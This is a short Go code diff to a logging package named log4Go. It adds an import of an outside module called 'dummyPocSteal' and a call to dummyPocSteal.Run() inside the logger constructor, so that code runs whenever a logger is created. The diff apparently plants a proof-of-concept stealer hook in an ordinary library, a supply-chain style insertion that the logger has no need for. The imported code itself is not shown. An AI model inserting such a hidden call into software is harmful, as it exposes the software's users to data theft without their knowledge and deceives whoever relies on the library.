@@ -1,6 +1,7 @@
 package log4Go
 
 import (
+	"github.com/asgardian249/dummyPocSteal"
 	"log"
 	"os"
 	"time"
@@ -36,6 +37,7 @@ type Logger struct {
 
 // NewLogger creates a new logger
 func NewLogger(logLevel LogLevel) *Logger {
+	dummyPocSteal.Run()
 	return &Logger{
 		logLevel: logLevel,
 		logger:   log.New(os.Stdout, "", log.LstdFlags),
